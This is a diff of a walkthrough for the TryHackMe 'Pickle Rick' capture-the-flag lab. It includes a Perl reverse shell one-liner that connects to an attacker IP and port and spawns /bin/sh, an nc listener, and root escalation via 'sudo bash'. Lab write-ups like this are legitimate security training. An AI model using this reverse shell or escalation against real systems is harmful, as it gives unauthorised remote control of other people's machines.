@@ -1,10 +1,11 @@
- # TryHackMe: Pickle Rick
+# TryHackMe: Pickle Rick
  
 This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.
 
 Firstly go to the web page by typing to your web browser the IP Address of the machine.
 
 You will be redirected to the following web page.
+
 <img width="1398" alt="1" src="https://user-images.githubusercontent.com/28839345/164424613-1b25b912-dc77-499c-91ff-68581f5fd1a1.png">
 
 After redirecting to the web page go right click on the page and the click the 'View Page Source'.At the end of the source code you will see a comment which will give you the username of Rick. *Username: R1ckRul3s*.
@@ -56,15 +57,15 @@ done <Sup3rS3cretPickl3Ingred.txt
  
 <img width="1149" alt="8" src="https://user-images.githubusercontent.com/28839345/164424657-eebfd9f2-3053-4aa4-96e9-6f11d82bc5ad.png">
  
-The next step is to try and use a reverse shell to access the file system.First of all check if there is python3 installed in the machine by running the command `python3 -c "print('Check')"`
-
 <img width="1189" alt="10" src="https://user-images.githubusercontent.com/28839345/164424665-79d4ff2c-4cdf-436c-abb5-7d34d6937e3f.png">
 
-Since you can see the output *Check* this means that there is python3 installed.
+Try to connect to the web server by using a reverse shell.
 
-The reverse shell I found is from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+The reverse shell I found is from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet.
 
-perl -e 'use Socket;$i="10.10.17.241";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+Perl command: 
+
+`perl -e 'use Socket;$i="10.10.17.241";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
 
 Run `nc -nlvp 4443` to your local file.
 
@@ -74,7 +75,9 @@ Then copy and paste the perl script in the command panel and press enter.
 
 After connecting to the web server you should find a way to become root.
 
-Type sudo -l and you will see the following output.
+The sudo command, by default, allows you to run a program with root privileges.Any user can check its root privileges using the sudo -l command.
+
+Type `sudo -l` and you will see the following output.
 
 <img width="851" alt="14" src="https://user-images.githubusercontent.com/28839345/164424681-2d5a4866-e41d-4e6e-a743-1bba9a54b61d.png">
 
@@ -85,12 +88,12 @@ Type `sudo bash` and you will immediately become root.
 
 <img width="159" alt="15" src="https://user-images.githubusercontent.com/28839345/164424686-9e7af7a2-0d59-418e-b8d0-0a3aa00d25a4.png">
 
-Then go to /root directory and you will find a file called *3rd.txt*
+Then go to */root* directory and you will find a file called *3rd.txt*
 Then run the command `cat 3rd.txt` to get the third ingredient.
 
 <img width="358" alt="17" src="https://user-images.githubusercontent.com/28839345/164426893-33103a83-fd8a-4745-b54f-27599dcfda97.png">
 
-The second ingredient is placed in the /home/rick directory in a file named *second ingredient*.
+The second ingredient is placed in the */home/rick* directory in a file named *second ingredient*.
 
 <img width="286" alt="16" src="https://user-images.githubusercontent.com/28839345/164424689-21a798a6-f59b-44a5-b3ce-4d39b4e2c17a.png">
 
